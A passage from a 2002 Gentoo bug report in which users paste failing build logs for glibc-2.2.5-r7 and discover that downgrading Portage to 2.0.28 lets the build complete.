/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/math:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/elf:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/dlfcn:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/nss:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/nis:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/rt:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/resolv:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/crypt:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/linuxthreads /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/math/test-float  > /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/math/test-float.out make[2]: *** [/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/math/test-float.out] Error 1 make[2]: Leaving directory `/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/math' make[1]: *** [math/tests] Error 2 make[1]: Leaving directory `/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5' make: *** [check] Error 2  /usr/portage/sys-libs/glibc/glibc-2.2.5-r7.ebuild: src_compile failed; exiting. ```  [Comment 2](#c2)  Martin Schlemmer (RETIRED)   gentoo-dev  2002-08-21 15:42:24 UTC  ``` I would really try to help, but these logs dont tell a thing .. sorry :(  Please attach more complete ones (emerge glibc &>borked-glibc, or something).  ```  [Comment 3](#c3)  Maurizio Disimino    2002-08-21 16:10:56 UTC  ``` gcc -nostdlib -nostartfiles -o /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/stdlib/test-a64l  -Wl,-dynamic-linker=/lib/ld-linux.so.2   -Wl,-z,combreloc /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/csu/crt1.o /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/csu/crti.o `gcc --print-file-name=crtbegin.o` /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/stdlib/test-a64l.o  -Wl,-rpath-link=/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/math:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/elf:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/dlfcn:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/nss:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/nis:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/rt:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/resolv:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/crypt:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/linuxthreads /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/libc.so.6 /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/libc_nonshared.a -lgcc `gcc --print-file-name=crtend.o` /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/csu/crtn.o GCONV_PATH=/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/iconvdata LC_ALL=C   /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/elf/ld-linux.so.2 --library-path /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/math:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/elf:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/dlfcn:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/nss:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/nis:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/rt:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/resolv:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/crypt:/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/linuxthreads /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/stdlib/test-a64l  > /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/stdlib/test-a64l.out cd /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/stdlib && gcc -O  -include ../config.h /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/stdlib/isomac.c -o isomac /var/tmp/portage/glibc-2.2.5-r7/temp/ccs4tRuD.o: In function `get_null_defines': /var/tmp/portage/glibc-2.2.5-r7/temp/ccs4tRuD.o(.text+0x13e): the use of `tmpnam' is dangerous, better use `mkstemp' /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/stdlib/isomac 'gcc'  \ '-I../include -I.. -I/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere -I../sysdeps/i386/elf -I../linuxthreads/sysdeps/unix/sysv/linux/i386 -I../linuxthreads/sysdeps/unix/sysv/linux -I../linuxthreads/sysdeps/pthread -I../sysdeps/pthread -I../linuxthreads/sysdeps/unix/sysv -I../linuxthreads/sysdeps/unix -I../linuxthreads/sysdeps/i386/i686 -I../linuxthreads/sysdeps/i386 -I../sysdeps/unix/sysv/linux/i386/i686 -I../sysdeps/unix/sysv/linux/i386 -I../sysdeps/unix/sysv/linux -I../sysdeps/gnu -I../sysdeps/unix/common -I../sysdeps/unix/mman -I../sysdeps/unix/inet -I../sysdeps/unix/sysv/i386 -I../sysdeps/unix/sysv -I../sysdeps/unix/i386 -I../sysdeps/unix -I../sysdeps/posix -I../sysdeps/i386/i686/fpu -I../sysdeps/i386/i686 -I../sysdeps/i386/i486 -I../sysdeps/i386/fpu -I../sysdeps/i386 -I../sysdeps/wordsize-32 -I../sysdeps/ieee754/ldbl-96 -I../sysdeps/ieee754/dbl-64 -I../sysdeps/ieee754/flt-32 -I../sysdeps/ieee754 -I../sysdeps/generic/elf -I../sysdeps/generic ' > /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/stdlib/isomac.out make[2]: *** [/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/stdlib/isomac.out] Error 139 make[2]: Leaving directory `/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/stdlib' make[1]: *** [stdlib/tests] Error 2 make[1]: Leaving directory `/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5' make: *** [check] Error 2  /usr/portage/sys-libs/glibc/glibc-2.2.5-r7.ebuild: src_compile failed; exiting.  Ximian glibc # gcc -v && emerge --version                                                                                                         Reading specs from /usr/lib/gcc-lib/i686-pc-linux-gnu/2.95.3/specs gcc version 2.95.3 20010315 (release) Portage 2.0.29  gentoo 1.2 stage1 x86 (duron700) standard gcc flags ```  [Comment 4](#c4)  Rigo    2002-08-21 16:22:26 UTC  ``` Created [attachment 3281](attachment.cgi?id=3281 "Output glibc") [[details](attachment.cgi?id=3281&action=edit "Output glibc")] Output glibc ```  [Comment 5](#c5)  Maurizio Disimino    2002-08-22 03:56:38 UTC  ``` >>> sys-libs/glibc-2.2.5-r7 merged.  Azarah, you was right ..  Portage .29 and its error detection code seems to be TOO sensible. Gentoo 1.4 - gcc 3.2 - portage .28    ```  [Comment 6](#c6)  Rigo    2002-08-22 07:39:28 UTC  ``` You are right...going back to portage 2.0.28 made compiling glibc-r7 a breeze ;)   Thanx a lot,  Rigo  Ps. More things I should know ;) ? It's so terribly quiet on the mailinglist about it :'-(    *  sys-libs/glibc       Latest version Available: 2.2.5-r7       Latest version Installed: 2.2.5-r7       Homepage: <http://www.gnu.org/software/libc/libc.html>       Description: GNU libc6 (also called glibc2) C library   lappy root # echo 'Yay, y'all so great ;-)' bash: syntax error near unexpected token `;-)'' lappy root #   Oops ;)  Rigo  ```  [Comment 7](#c7)  P.A.    2002-08-22 15:21:13 UTC  ``` mv -f /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/malloc/stamp.osT /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/malloc/stamp.os make[2]: Leaving directory `/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/malloc' make -j2 -C string subdir_lib make[2]: Entering directory `/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/string' .././scripts/mkinstalldirs /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/string .././scripts/mkinstalldirs /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/string mkdir /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/string .././scripts/mkinstalldirs /var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/string make[2]: .././scripts/mkinstalldirs: Command not found make[2]: *** [/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/buildhere/string/memrchr.d] Error 127 make[2]: *** Waiting for unfinished jobs.... make[2]: *** Waiting for unfinished jobs.... make[2]: Leaving directory `/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5/string' make[1]: *** [string/subdir_lib] Error 2 make[1]: Leaving directory `/var/tmp/portage/glibc-2.2.5-r7/work/glibc-2.2.5' make: *** [all] Error 2  Getting this error with emerge 0.28 and gcc 3.2   ```  [Comment 8](#c8)  Martin Schlemmer (RETIRED)   gentoo-dev  2002-09-08 03:30:55 UTC  ``` New portage fix this.  ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=6766)
* - [XML](show_bug.cgi?ctype=xml&id=6766)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=6766)
* - [Clone In The Same
  Product](enter_bug.cgi?cloned_bug_id=6766&product=Gentoo%20Linux)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=6766&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=6766&GoAheadAndLogIn=1#forgot)
    Login:

    [x]


